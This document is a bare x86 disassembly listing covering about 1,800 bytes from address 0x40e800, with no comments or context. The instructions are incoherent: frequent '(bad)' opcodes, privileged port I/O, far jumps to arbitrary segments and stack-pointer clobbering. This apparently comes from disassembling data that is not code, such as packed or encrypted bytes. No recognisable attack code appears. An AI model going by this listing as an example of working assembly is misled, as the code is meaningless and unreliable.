  40e800:	imul   esp,DWORD PTR [edi+0x40],0xb320921b
  40e807:	ret    
  40e808:	cs lea edx,es:[esi-0xdb55ea4]
  40e810:	enter  0x8c71,0xd9
  40e814:	mov    dl,0x12
  40e816:	aaa    
  40e817:	lods   eax,DWORD PTR ds:[esi]
  40e818:	dec    ecx
  40e819:	push   esi
  40e81a:	ret    
  40e81b:	or     BYTE PTR [eax],dl
  40e81d:	jns    0x40e843
  40e81f:	xor    bh,BYTE PTR [esi+0x6c2b22b5]
  40e825:	mov    dh,0x6f
  40e827:	(bad)  
  40e828:	xor    DWORD PTR [ebx],edi
  40e82a:	mov    cs,WORD PTR [edi]
  40e82c:	out    0xd1,eax
  40e82e:	les    edi,FWORD PTR gs:[ebx-0x423e1d11]
  40e835:	into   
  40e836:	xor    eax,0x4a4c0216
  40e83b:	cmp    BYTE PTR [eax],bh
  40e83d:	push   edi
  40e83e:	adc    bh,BYTE PTR [esi]
  40e840:	cwde   
  40e841:	xor    ch,BYTE PTR [eax+0x14]
  40e844:	dec    DWORD PTR [edi]
  40e846:	and    DWORD PTR [edi-0x5fdf87c3],0x7a
  40e84d:	xlat   BYTE PTR ds:[ebx]
  40e84e:	cmp    ebx,DWORD PTR [esp+ebp*4-0x62717eff]
  40e855:	inc    edi
  40e856:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e857:	fnstsw WORD PTR [ecx+ebp*1-0x22]
  40e85b:	paddsw mm3,QWORD PTR [edi+0x40]
  40e85f:	in     eax,0xbc
  40e861:	adc    BYTE PTR [esi],bl
  40e863:	inc    edx
  40e864:	adc    eax,0xa47d32d1
  40e869:	mov    esp,0xdcd2385e
  40e86e:	pop    edx
  40e86f:	cmp    eax,0x7a211f63
  40e874:	bound  ebp,QWORD PTR [ecx+0x10d118d0]
  40e87a:	out    dx,eax
  40e87b:	rcr    DWORD PTR [edi+0x78],0x33
  40e87f:	ins    BYTE PTR es:[edi],dx
  40e880:	cs inc ebx
  40e882:	ret    0xa8e2
  40e885:	imul   eax,DWORD PTR [edx+0x12708ebe],0xf5d46667
  40e88f:	je     0x40e861
  40e891:	xchg   edx,eax
  40e892:	shr    DWORD PTR [eax-0x620e71dc],0x46
  40e899:	daa    
  40e89a:	mov    al,0x87
  40e89c:	sub    eax,0x50f28a02
  40e8a1:	push   ebx
  40e8a2:	lods   eax,DWORD PTR ds:[esi]
  40e8a3:	jno    0x40e88a
  40e8a5:	es push ebx
  40e8a7:	jbe    0x40e8f0
  40e8a9:	fcmovnu st,st(3)
  40e8ab:	push   eax
  40e8ac:	test   bl,0x8
  40e8af:	pop    edx
  40e8b0:	out    dx,eax
  40e8b1:	sub    ebp,DWORD PTR [ebx]
  40e8b3:	out    dx,al
  40e8b4:	jmp    0x6339:0x361c8dfd
  40e8bb:	mov    bl,0xc3
  40e8bd:	clc    
  40e8be:	sbb    cl,BYTE PTR cs:[eax+0x3b]
  40e8c2:	pop    edx
  40e8c3:	xchg   esp,eax
  40e8c4:	inc    ebx
  40e8c5:	retf   
  40e8c6:	int3   
  40e8c7:	enter  0xa7b2,0x8b
  40e8cb:	mov    ds:0x79e98cf8,al
  40e8d0:	sbb    ebx,DWORD PTR [ecx]
  40e8d2:	(bad)  
  40e8d4:	idiv   DWORD PTR ds:0xd9050317
  40e8da:	cmp    cl,al
  40e8dc:	call   esi
  40e8de:	cmp    dh,dl
  40e8e0:	mov    ah,0x4
  40e8e2:	mov    fs:0x74916d6a,al
  40e8e8:	and    eax,0x368f31cb
  40e8ed:	mov    dh,0xe0
  40e8ef:	addr16 addr16 mov eax,0xcc5274a9
  40e8f6:	mov    edi,0x2afc962d
  40e8fb:	jmp    0x7190:0x364512cf
  40e902:	add    DWORD PTR ds:0x3b2654f3,ecx
  40e908:	add    eax,0x4fc58ef3
  40e90d:	add    DWORD PTR [ebp+0x13f3167d],edi
  40e913:	iret   
  40e914:	mov    al,0x1d
  40e916:	enter  0xed25,0xc3
  40e91a:	(bad)  
  40e91b:	std    
  40e91c:	lock add cl,dh
  40e91f:	jl     0x40e913
  40e921:	cmp    dh,dl
  40e923:	sti    
  40e924:	lods   eax,DWORD PTR ds:[esi]
  40e925:	iret   
  40e926:	rcr    ah,cl
  40e928:	or     DWORD PTR [esi+0x1e4fe139],edi
  40e92e:	push   ecx
  40e92f:	hlt    
  40e930:	mov    BYTE PTR [ecx],bh
  40e932:	fild   QWORD PTR [edx+0x6ad28695]
  40e938:	pop    es
  40e939:	jge    0x40e934
  40e93b:	aaa    
  40e93c:	mov    ds,esp
  40e93e:	popf   
  40e93f:	xlat   BYTE PTR ds:[ebx]
  40e940:	aad    0xb5
  40e942:	in     al,dx
  40e943:	xchg   edi,eax
  40e944:	push   ds
  40e945:	adc    BYTE PTR [esi+0x12d55434],ch
  40e94b:	(bad)  [edx+0x1f]
  40e94e:	xor    BYTE PTR [edi-0x17],cl
  40e951:	inc    ebx
  40e952:	cs ja  0x40e90a
  40e955:	sbb    edi,DWORD PTR [edx+0x3cc71776]
  40e95b:	adc    ebx,edx
  40e95d:	inc    ebx
  40e95e:	add    al,0x35
  40e960:	arpl   WORD PTR [edi-0x1b],sp
  40e963:	hlt    
  40e964:	aaa    
  40e965:	std    
  40e966:	sub    eax,DWORD PTR [edi+0x5f1077a3]
  40e96c:	xchg   DWORD PTR [ebp+0x50face9],edx
  40e972:	cmp    BYTE PTR [esi+0x2b397907],ah
  40e978:	mov    al,ds:0x6f583502
  40e97d:	in     al,0xc1
  40e97f:	mov    edi,0x5980fde0
  40e984:	jno    0x40e9e9
  40e986:	mov    BYTE PTR [esi+0x7c],ch
  40e989:	xor    eax,0xf633c0ed
  40e98e:	xor    ebx,ebp
  40e990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e991:	fwait
  40e992:	xor    ecx,DWORD PTR ds:0x2bcf6fcc
  40e998:	out    dx,eax
  40e999:	pop    edx
  40e99a:	pop    ecx
  40e99b:	aam    0xd2
  40e99d:	leave  
  40e99e:	data16 lods al,BYTE PTR ds:[esi]
  40e9a0:	sar    DWORD PTR [ebx+ebp*8+0x31],1
  40e9a4:	mov    eax,0xb842060c
  40e9a9:	inc    eax
  40e9aa:	mov    al,ds:0x2475938f
  40e9af:	mov    al,ds:0xab8090e0
  40e9b4:	inc    ebx
  40e9b5:	mov    esp,0x52071115
  40e9ba:	xchg   edx,eax
  40e9bb:	jo     0x40e9ff
  40e9bd:	inc    ecx
  40e9be:	mov    ebx,0xd3cf2139
  40e9c3:	nop
  40e9c4:	mov    edx,DWORD PTR ds:0xc35e0c2a
  40e9ca:	lahf   
  40e9cb:	pop    ebx
  40e9cc:	stos   BYTE PTR es:[edi],al
  40e9cd:	pop    ds
  40e9ce:	or     DWORD PTR [eax+0x542e15e0],ebp
  40e9d4:	pop    es
  40e9d5:	stc    
  40e9d6:	lahf   
  40e9d7:	jle    0x40e95b
  40e9d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9da:	shl    BYTE PTR [esi],0x5
  40e9dd:	ret    
  40e9de:	popa   
  40e9df:	push   0xffffffc8
  40e9e1:	js     0x40e9f4
  40e9e3:	push   es
  40e9e4:	es jmp 0x40e971
  40e9e7:	fiadd  WORD PTR [edi+0x37]
  40e9ea:	leave  
  40e9eb:	mov    ds:0xbfefb41a,eax
  40e9f0:	push   0xffffffad
  40e9f2:	or     eax,0x8a4cdcc9
  40e9f7:	fwait
  40e9f8:	mov    dh,0x12
  40e9fa:	popf   
  40e9fb:	loope  0x40ea19
  40e9fd:	xor    dh,bh
  40e9ff:	(bad)
  40ea02:	ins    DWORD PTR es:[edi],dx
  40ea03:	xlat   BYTE PTR ds:[ebx]
  40ea04:	in     al,0x41
  40ea06:	pop    ss
  40ea07:	mov    bh,0xd3
  40ea09:	inc    ebx
  40ea0a:	aaa    
  40ea0b:	pushf  
  40ea0c:	jmp    0xd676:0x4887f440
  40ea13:	jmp    0xce9f113c
  40ea18:	lea    ecx,[edi]
  40ea1a:	mov    al,0xa7
  40ea1c:	ds jmp 0xe9b8:0xc84236d
  40ea24:	loope  0x40ea5b
  40ea26:	push   esi
  40ea27:	rcr    DWORD PTR [esp+eax*2-0x5],1
  40ea2b:	in     eax,dx
  40ea2c:	call   0x8c9d:0x60ee1ee1
  40ea33:	test   al,0xc
  40ea35:	mov    al,ds:0x9a751f2e
  40ea3a:	je     0x40ea83
  40ea3c:	jnp    0x40ea80
  40ea3e:	mov    dl,0xa
  40ea40:	pop    eax
  40ea41:	retf   
  40ea42:	shr    DWORD PTR [esi],cl
  40ea44:	jg     0x40ea2a
  40ea46:	push   0x5d57a732
  40ea4b:	popf   
  40ea4c:	cs out dx,al
  40ea4e:	mov    dh,0xcf
  40ea50:	retf   
  40ea51:	jg     0x40ea7c
  40ea53:	clc    
  40ea54:	in     eax,dx
  40ea55:	xchg   ecx,eax
  40ea56:	les    esp,FWORD PTR [edx+0x44cbca73]
  40ea5c:	sbb    edi,DWORD PTR [edi-0x5d]
  40ea5f:	test   DWORD PTR [ecx],ebx
  40ea61:	imul   edi,DWORD PTR fs:[esi+0xe],0x14
  40ea66:	xchg   esi,eax
  40ea67:	lods   eax,DWORD PTR gs:[esi]
  40ea69:	cs pop eax
  40ea6b:	in     eax,0x7c
  40ea6d:	lods   eax,DWORD PTR ds:[esi]
  40ea6e:	or     BYTE PTR [esi+ebp*4],cl
  40ea71:	jle    0x40eaa2
  40ea73:	cld    
  40ea74:	mov    eax,0x7f77e375
  40ea79:	sahf   
  40ea7a:	sub    DWORD PTR [esi+0x66e16a98],0xfffffffe
  40ea81:	pushf  
  40ea82:	(bad)  
  40ea83:	dec    ebp
  40ea84:	mov    al,ds:0xb3184cd6
  40ea89:	test   eax,0xd6cad890
  40ea8e:	sbb    eax,0x7006a07a
  40ea93:	jmp    0xbb227dd2
  40ea98:	sub    BYTE PTR [ecx+0x541e825d],bl
  40ea9e:	adc    dl,bh
  40eaa0:	enter  0x318d,0x6a
  40eaa4:	cmp    DWORD PTR [ebp-0x42e4b9a0],0x59d6ab38
  40eaae:	inc    ecx
  40eaaf:	lds    edi,FWORD PTR [eax]
  40eab1:	push   ds
  40eab2:	pop    eax
  40eab3:	xor    eax,0xea0ed272
  40eab8:	inc    esi
  40eab9:	(bad)  
  40eaba:	inc    BYTE PTR [eax+0x3725aafb]
  40eac0:	inc    ecx
  40eac1:	xchg   ecx,eax
  40eac2:	(bad)  
  40eac3:	in     al,0x96
  40eac5:	outs   dx,BYTE PTR ds:[esi]
  40eac6:	push   cs
  40eac7:	(bad)  
  40eac8:	mov    esi,0x2f4efa50
  40eacd:	xor    eax,0x246634a8
  40ead2:	fmul   QWORD PTR [ebx+0x44]
  40ead5:	inc    eax
  40ead6:	scas   eax,DWORD PTR es:[edi]
  40ead7:	sbb    DWORD PTR [ecx],edi
  40ead9:	and    dl,ah
  40eadb:	jge    0x40eb4a
  40eadd:	aam    0x75
  40eadf:	push   ecx
  40eae0:	fcmovbe st,st(1)
  40eae2:	retf   0x5497
  40eae5:	xchg   ebp,eax
  40eae7:	or     edx,DWORD PTR [esi]
  40eae9:	push   esp
  40eaea:	or     al,0x3b
  40eaec:	ret    0x93f1
  40eaef:	test   BYTE PTR [ecx-0x63d58ec1],cl
  40eaf5:	sbb    WORD PTR [ecx],ax
  40eaf8:	sti    
  40eaf9:	out    0x41,eax
  40eafb:	dec    ebp
  40eafc:	add    al,0x46
  40eafe:	pop    ebx
  40eaff:	rcr    ah,1
  40eb01:	stc    
  40eb02:	lahf   
  40eb03:	push   0xffffffef
  40eb05:	ficomp WORD PTR [ebx+0x8d04cae]
  40eb0b:	sub    BYTE PTR [eax],dh
  40eb0d:	dec    ebp
  40eb0e:	mov    ds:0xbe0966c4,eax
  40eb13:	xor    al,0x6e
  40eb15:	jp     0x40eb32
  40eb17:	add    DWORD PTR [eax+esi*4+0x24af306a],ebx
  40eb1e:	dec    edx
  40eb1f:	popf   
  40eb20:	std    
  40eb21:	lock push ebp
  40eb23:	(bad)  
  40eb24:	lock gs xchg edx,eax
  40eb27:	int3   
  40eb28:	stos   BYTE PTR es:[edi],al
  40eb29:	mov    bl,0x66
  40eb2b:	arpl   WORD PTR [eax+0x16c76554],cx
  40eb31:	adc    al,0x16
  40eb33:	ja     0x40eb7e
  40eb35:	ss push edi
  40eb37:	repz xor eax,0x649a2b09
  40eb3d:	pop    ebp
  40eb3e:	gs pop ds
  40eb40:	(bad)  [ecx-0x2dbbc690]
  40eb46:	pusha  
  40eb47:	scas   al,BYTE PTR es:[edi]
  40eb48:	cld    
  40eb49:	outs   dx,BYTE PTR ds:[esi]
  40eb4a:	adc    bl,BYTE PTR [ecx+0x5a]
  40eb4d:	sub    ebp,DWORD PTR [ecx+ebx*4+0x76]
  40eb51:	js     0x40eb1b
  40eb53:	test   eax,ecx
  40eb55:	cli    
  40eb56:	fbld   TBYTE PTR [eax]
  40eb58:	xchg   esi,eax
  40eb59:	sbb    ebp,DWORD PTR [ecx+edi*8]
  40eb5c:	das    
  40eb5d:	dec    edx
  40eb5e:	dec    eax
  40eb5f:	or     ebx,ecx
  40eb61:	in     al,dx
  40eb62:	add    ecx,DWORD PTR [ecx+edi*8-0x44]
  40eb66:	mov    bh,dh
  40eb68:	jno    0x40ebd7
  40eb6a:	out    dx,eax
  40eb6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb6c:	sbb    eax,0xf03676b5
  40eb71:	pop    eax
  40eb72:	adc    DWORD PTR [ecx+ebp*8],edi
  40eb75:	and    DWORD PTR [eax],edi
  40eb77:	nop
  40eb78:	mov    ds:0x1d92c6d0,eax
  40eb7d:	imul   eax,DWORD PTR [ebx+0x74],0x62
  40eb81:	dec    esi
  40eb82:	aam    0x8d
  40eb84:	push   esp
  40eb85:	js     0x40ebf4
  40eb87:	inc    ecx
  40eb88:	xchg   edx,eax
  40eb89:	lods   al,BYTE PTR ds:[esi]
  40eb8a:	cli    
  40eb8b:	popf   
  40eb8c:	fisub  DWORD PTR [eax]
  40eb8e:	dec    edi
  40eb8f:	add    edi,edi
  40eb91:	fdivrp st(6),st
  40eb93:	mov    dl,BYTE PTR [ebp+0x6b]
  40eb96:	jmp    0x40ebbf
  40eb98:	ret    
  40eb99:	mov    ah,0x82
  40eb9b:	jle    0x40eb63
  40eb9d:	loope  0x40eb1f
  40eb9f:	adc    BYTE PTR [esi],0x47
  40eba2:	inc    cx
  40eba4:	pop    es
  40eba5:	ins    BYTE PTR es:[edi],dx
  40eba6:	and    al,bl
  40eba8:	sub    dl,bh
  40ebaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebac:	(bad)
  40ebaf:	push   eax
  40ebb0:	outs   dx,BYTE PTR ds:[esi]
  40ebb1:	add    al,0xd2
  40ebb3:	ficom  DWORD PTR [ebx]
  40ebb5:	sbb    BYTE PTR [ecx+eax*1-0x77],ah
  40ebb9:	mov    ebp,ebx
  40ebbb:	loopne 0x40ebc2
  40ebbd:	loop   0x40eb74
  40ebbf:	jbe    0x40ebb7
  40ebc1:	std    
  40ebc2:	jecxz  0x40eb6f
  40ebc4:	ret    
  40ebc5:	popf   
  40ebc6:	pusha  
  40ebc7:	dec    edx
  40ebc8:	stos   DWORD PTR es:[edi],eax
  40ebc9:	or     al,bl
  40ebcb:	stos   DWORD PTR es:[edi],eax
  40ebcc:	fidiv  DWORD PTR [ebp+0x58]
  40ebcf:	pop    edi
  40ebd0:	pop    esi
  40ebd1:	mov    ch,0x7c
  40ebd3:	inc    ebx
  40ebd4:	cmp    eax,0xa037802e
  40ebd9:	pop    edx
  40ebda:	mov    esi,0xec8ea2b2
  40ebdf:	sbb    al,0x40
  40ebe1:	pop    esp
  40ebe2:	pop    ds
  40ebe3:	sahf   
  40ebe4:	jecxz  0x40ebf6
  40ebe6:	fstp   QWORD PTR [ebp+0x5ad37238]
  40ebec:	pusha  
  40ebed:	pop    ss
  40ebee:	mov    ds:0xc1a0c56b,eax
  40ebf3:	(bad)  [ebp-0x69a97baf]
  40ebf9:	scas   al,BYTE PTR es:[edi]
  40ebfa:	cmp    BYTE PTR [ebp+0x116acf1],0xe0
  40ec01:	sub    eax,edi
  40ec03:	adc    al,0x3b
  40ec05:	mov    WORD PTR [edi+0x370a7cf2],cs
  40ec0b:	fild   QWORD PTR [ebx-0x3791fac2]
  40ec11:	cdq    
  40ec12:	fs ja  0x40ec93
  40ec15:	out    0xd1,eax
  40ec17:	sbb    eax,0x8a6a3718
  40ec1c:	xor    DWORD PTR [eax],edi
  40ec1e:	push   ecx
  40ec1f:	leave  
  40ec20:	adc    DWORD PTR ds:[esi-0x6f],0x23d6bc29
  40ec28:	mov    gs,WORD PTR [esi+eiz*1-0x2067b5a0]
  40ec2f:	mov    DWORD PTR [eax],ebx
  40ec31:	mov    bh,0xaf
  40ec33:	sub    DWORD PTR [edi],esi
  40ec35:	gs add eax,0xa1fb6f5d
  40ec3b:	lds    ecx,FWORD PTR [ecx]
  40ec3d:	jmp    0xb2582c88
  40ec42:	cmp    DWORD PTR [esi],0x4c
  40ec45:	or     eax,0xf8a5521
  40ec4a:	mov    al,ds:0x32735bfa
  40ec4f:	adc    DWORD PTR [edi],ecx
  40ec51:	pushf  
  40ec52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec53:	jl     0x40ec72
  40ec55:	mov    DWORD PTR [bx+0x3744],0x7b982cad
  40ec5e:	add    eax,0x57441611
  40ec63:	je     0x40ec06
  40ec65:	inc    ebp
  40ec66:	in     al,dx
  40ec67:	pop    ds
  40ec68:	ins    DWORD PTR es:[edi],dx
  40ec69:	adc    DWORD PTR [edx+0x63],0x82d4b084
  40ec70:	adc    ch,BYTE PTR [ecx-0x64]
  40ec73:	in     al,dx
  40ec74:	mov    eax,ds:0x1bce4fda
  40ec79:	jge    0x40ec8c
  40ec7b:	jmp    0xbd456ec
  40ec80:	test   al,0x7d
  40ec82:	jno    0x40ec8e
  40ec84:	ds add ebp,esi
  40ec87:	mov    al,0xd5
  40ec89:	repnz stc 
  40ec8b:	xor    bh,ch
  40ec8d:	addr16 ja 0x40ecbe
  40ec90:	test   DWORD PTR [ecx+0x4c4370fb],edi
  40ec96:	xor    al,0x35
  40ec98:	or     dh,0xf1
  40ec9b:	pop    ecx
  40ec9c:	les    ecx,FWORD PTR [esi+eax*4-0x18]
  40eca0:	and    DWORD PTR [ebx+ebx*2+0x31],0x3d
  40eca5:	out    dx,al
  40eca6:	or     ebp,DWORD PTR [esi]
  40eca8:	lock test eax,0x3d66bf6f
  40ecae:	(bad)  
  40ecaf:	push   esi
  40ecb0:	leave  
  40ecb1:	ins    BYTE PTR es:[edi],dx
  40ecb2:	arpl   WORD PTR [ebx-0x65],bp
  40ecb5:	dec    eax
  40ecb6:	mov    DWORD PTR [edi-0x74],eax
  40ecb9:	dec    edi
  40ecba:	int3   
  40ecbb:	xchg   ebx,eax
  40ecbc:	mov    WORD PTR gs:[ebx+edi*1-0x3f],ss
  40ecc1:	gs sahf 
  40ecc3:	dec    esi
  40ecc4:	iret   
  40ecc5:	lea    ecx,[ebx+0x5df45d7a]
  40eccb:	call   0xdb2a:0x410678b5
  40ecd2:	mov    eax,ds:0x5596ce15
  40ecd7:	ds push edx
  40ecd9:	inc    edx
  40ecda:	inc    esp
  40ecdb:	xor    eax,0xe5cd6c2b
  40ece0:	dec    esp
  40ece1:	cmp    al,0x69
  40ece3:	add    ah,BYTE PTR [esi-0x2363aa81]
  40ece9:	or     al,0x6a
  40eceb:	in     eax,0x62
  40eced:	stos   DWORD PTR es:[edi],eax
  40ecee:	sbb    al,0xf3
  40ecf0:	push   ds
  40ecf1:	add    BYTE PTR [ebp-0x361eb3e],cl
  40ecf7:	mov    ds:0xffc8942d,eax
  40ecfc:	das    
  40ecfd:	repnz pop eax
  40ecff:	ror    BYTE PTR [ebp+0x77d11f9a],cl
  40ed05:	or     eax,0xf95d30f7
  40ed0a:	add    cl,bh
  40ed0c:	ret    0x184e
  40ed0f:	adc    BYTE PTR [ecx-0x28],0x29
  40ed13:	and    al,BYTE PTR [edi+ebp*1+0x15932dff]
  40ed1a:	push   ecx
  40ed1b:	in     al,dx
  40ed1c:	jnp    0x40eccb
  40ed1e:	xor    al,0x66
  40ed20:	arpl   WORD PTR [ecx],di
  40ed22:	xor    eax,0x4e192ae5
  40ed27:	out    0xf6,al
  40ed29:	sbb    al,0x60
  40ed2b:	jecxz  0x40ed98
  40ed2d:	mov    ecx,0x4e1bd8f1
  40ed32:	shld   DWORD PTR [eax+eax*4+0x7414a579],ebx,0x58
  40ed3b:	xor    BYTE PTR [ebx+ebx*4-0x48],cl
  40ed3f:	rcl    DWORD PTR [eax],1
  40ed41:	sbb    eax,0xd8b49406
  40ed46:	cmc    
  40ed47:	cmp    DWORD PTR cs:[ebp+0x7c47aa90],0x35
  40ed4f:	jb     0x40edc7
  40ed51:	cs xor edi,ebp
  40ed54:	fisub  DWORD PTR [esi]
  40ed56:	lods   eax,DWORD PTR ds:[esi]
  40ed57:	xchg   edi,eax
  40ed58:	inc    ecx
  40ed59:	xor    dl,0x8b
  40ed5c:	(bad)  
  40ed5d:	loope  0x40ecf1
  40ed5f:	int    0xcb
  40ed61:	call   0x1a76de24
  40ed66:	and    BYTE PTR [ecx],ch
  40ed68:	inc    esi
  40ed69:	cmp    edi,edx
  40ed6b:	jbe    0x40edb9
  40ed6d:	inc    BYTE PTR [ebx-0xd]
  40ed70:	in     eax,0x1f
  40ed72:	ja     0x40ed05
  40ed74:	inc    ecx
  40ed75:	lahf   
  40ed76:	outs   dx,DWORD PTR ds:[esi]
  40ed77:	mov    dh,0xb0
  40ed79:	mov    dh,0xd5
  40ed7b:	cdq    
  40ed7c:	xchg   BYTE PTR [ebp+0x1f],bl
  40ed7f:	(bad)  
  40ed80:	fnsave [ebx]
  40ed82:	iret   
  40ed83:	pop    edx
  40ed84:	ins    DWORD PTR es:[edi],dx
  40ed85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed86:	je     0x40ed13
  40ed88:	add    al,0xfa
  40ed8a:	ds addr16 inc esi
  40ed8d:	mov    esi,0xe111f13
  40ed92:	sahf   
  40ed93:	mov    ds:0x6bc5a8fd,al
  40ed98:	dec    esi
  40ed99:	loopne 0x40edad
  40ed9b:	dec    eax
  40ed9c:	dec    eax
  40ed9d:	adc    eax,0x3e7dfaaa
  40eda2:	in     eax,0x24
  40eda4:	stc    
  40eda5:	in     al,0xca
  40eda7:	iret   
  40eda8:	loopne 0x40eded
  40edaa:	jo     0x40edfe
  40edac:	fisttp WORD PTR [ebx-0x6a]
  40edaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edb0:	daa    
  40edb1:	ror    DWORD PTR [ebx],cl
  40edb3:	lea    eax,[edi+ebx*2]
  40edb6:	mov    WORD PTR [edi+0x5c],?
  40edb9:	addr16 lock pop ecx
  40edbc:	xchg   esp,eax
  40edbd:	xor    DWORD PTR [edi-0x15],0x3713a3d9
  40edc4:	inc    esi
  40edc5:	cdq    
  40edc6:	push   cs
  40edc7:	out    dx,al
  40edc8:	or     BYTE PTR [ebx+0xc],al
  40edcb:	mov    al,0xf4
  40edcd:	fxtract 
  40edcf:	out    dx,eax
  40edd0:	and    BYTE PTR [edi+ebx*8-0x70],ah
  40edd4:	xchg   WORD PTR [edx-0x11],dx
  40edd8:	adc    DWORD PTR [eax],edi
  40edda:	jg     0x40edf0
  40eddc:	xlat   BYTE PTR ds:[ebx]
  40eddd:	hlt    
  40edde:	cdq    
  40eddf:	dec    esi
  40ede0:	retf   0xe965
  40ede3:	test   al,0x1b
  40ede5:	dec    ebx
  40ede6:	pop    ebp
  40ede7:	fimul  WORD PTR [edi]
  40ede9:	push   ebp
  40edea:	(bad)  
  40edeb:	mov    dl,0xd2
  40eded:	dec    eax
  40edee:	sbb    DWORD PTR fs:[edi+0x1f],ebx
  40edf2:	cmp    bh,BYTE PTR [esi-0x568ff9f]
  40edf8:	jle    0x40ee21
  40edfa:	sub    al,0xf2
  40edfc:	aad    0x1d
  40edfe:	iret   
  40edff:	sahf   
  40ee00:	imul   edx,DWORD PTR [eax],0xfffffffa
  40ee03:	(bad)  [edx+0x60]
  40ee06:	shr    DWORD PTR [ecx+0x12],0x37
  40ee0a:	jb     0x40edba
  40ee0c:	js     0x40edc2
  40ee0e:	mov    edi,0x2647c471
  40ee13:	(bad)  
  40ee14:	mov    BYTE PTR [edi],cl
  40ee16:	rol    DWORD PTR [ebx+0x38b56392],0x1d
  40ee1d:	cld    
  40ee1e:	daa    
  40ee1f:	sub    eax,DWORD PTR [edx-0x7e]
  40ee22:	ds loop 0x40ee2a
  40ee25:	mov    esp,0x31cea17d
  40ee2a:	bound  esp,QWORD PTR [edi]
  40ee2c:	fwait
  40ee2d:	xor    al,BYTE PTR [ecx+0x71c35753]
  40ee33:	push   esp
  40ee34:	and    DWORD PTR [eax-0xe308373],eax
  40ee3a:	push   ecx
  40ee3b:	sub    edi,DWORD PTR [eax+0x2a]
  40ee3e:	pxor   mm5,QWORD PTR [ecx]
  40ee41:	jbe    0x40eead
  40ee43:	fiadd  DWORD PTR [esi]
  40ee45:	inc    ebx
  40ee46:	mov    bh,0xb2
  40ee48:	clc    
  40ee49:	xchg   ebp,eax
  40ee4a:	imul   esi,DWORD PTR ds:0x738fcb3b,0xffffffb0
  40ee51:	or     DWORD PTR [ebp-0x29],esp
  40ee54:	add    al,BYTE PTR [esi+eax*4]
  40ee57:	cmc    
  40ee58:	push   edx
  40ee59:	outs   dx,BYTE PTR ds:[esi]
  40ee5a:	fcom   st(7)
  40ee5c:	out    0xc5,al
  40ee5e:	dec    edi
  40ee5f:	pop    edi
  40ee60:	mov    edi,0xbebc49c3
  40ee65:	stos   DWORD PTR es:[edi],eax
  40ee66:	cmp    al,0x6b
  40ee68:	dec    ebp
  40ee69:	dec    esp
  40ee6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee6b:	add    ebx,esi
  40ee6d:	pop    edi
  40ee6e:	xchg   ecx,eax
  40ee6f:	stc    
  40ee70:	sbb    DWORD PTR [edi],esi
  40ee72:	outs   dx,BYTE PTR ds:[esi]
  40ee73:	(bad)  
  40ee74:	mov    DWORD PTR [esi-0x201e3c0e],esp
  40ee7a:	dec    edx
  40ee7b:	add    DWORD PTR [eax+0x6a],edi
  40ee7e:	xchg   edx,eax
  40ee7f:	bound  ecx,QWORD PTR ds:0xeccd15cf
  40ee85:	inc    esi
  40ee86:	dec    esp
  40ee87:	out    0x32,al
  40ee89:	jmp    0xc53f:0xdc60a273
  40ee90:	dec    edx
  40ee91:	xor    eax,0x20ba8e6b
  40ee96:	lea    eax,[ebx+0x5e853931]
  40ee9c:	icebp  
  40ee9d:	lods   al,BYTE PTR ds:[esi]
  40ee9e:	lods   al,BYTE PTR ds:[esi]
  40eea0:	jne    0x40eecf
  40eea2:	cs cld 
  40eea4:	adc    BYTE PTR [edi-0x157f37b0],dh
  40eeaa:	mov    ebx,0x8945311a
  40eeaf:	ret    
  40eeb0:	fwait
  40eeb1:	pop    ds
  40eeb2:	jno    0x40ef16
  40eeb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eeb5:	xchg   esi,eax
  40eeb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eeb7:	sti    
  40eeb8:	aas    
  40eeb9:	pop    ss
  40eeba:	push   cs
  40eebb:	push   0xfd0158e0
  40eec0:	jg     0x40eee8
  40eec2:	cs jno 0x40eeb7
  40eec5:	push   0xffffffe3
  40eec7:	and    eax,0x18f91bd3
  40eecc:	cmp    esp,DWORD PTR [edx]
  40eece:	test   eax,0x58ac3e63
  40eed3:	mov    eax,0x7e27e9ae
  40eed8:	int    0x6a
  40eeda:	fwait
  40eedb:	loopne 0x40ef16
  40eedd:	mov    bh,0x6
  40eedf:	xor    eax,0xc217a564
  40eee4:	or     bl,BYTE PTR [esi+eax*2+0x5c01f820]
  40eeeb:	sti    
  40eeec:	jge    0x40eea6
  40eeee:	mov    al,ds:0xedae20dd
  40eef3:	into   
  40eef4:	fs rcl bl,0x49
  40eef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eef9:	fistp  DWORD PTR [ebp+edx*2+0x4a8151b9]
  40ef00:	mov    es,WORD PTR [edi+0x6f]
  40ef03:	into   
  40ef04:	jbe    0x40ef73
  40ef06:	cmc    
  40ef07:	push   esp
  40ef08:	cmp    al,0x34
  40ef0a:	bound  edi,QWORD PTR [ecx]
  40ef0c:	sub    DWORD PTR [edx+0x78ce2d80],esp
  40ef12:	add    ch,cl
  40ef14:	adc    BYTE PTR [ebx+0x7c],0x51
  40ef18:	js     0x40ef48
  40ef1a:	jecxz  0x40eea9
  40ef1c:	jae    0x40eeab
  40ef1e:	xchg   edx,eax
  40ef1f:	dec    edi
  40ef20:	push   edi
  40ef21:	ss ins BYTE PTR es:[edi],dx
  40ef23:	xor    BYTE PTR [edx-0x4c],ah
  40ef26:	aas    
  40ef27:	(bad)  
  40ef28:	ror    BYTE PTR [edx+0x14086068],0x27
  40ef2f:	leave  
  40ef30:	xor    ebp,0x8c2a3025
  40ef36:	shl    DWORD PTR [esi-0x783b741f],1
  40ef3c:	sti    
  40ef3d:	bound  esp,QWORD PTR [ebp+0x18]
  40ef40:	add    al,0xa6
  40ef42:	push   ss
  40ef43:	sbb    al,0x14
  40ef45:	pop    esi
  40ef46:	dec    esp
  40ef47:	mov    eax,ds:0xfc37a3b9
  40ef4c:	inc    esp
  40ef4d:	call   0xe06:0x41865b4d
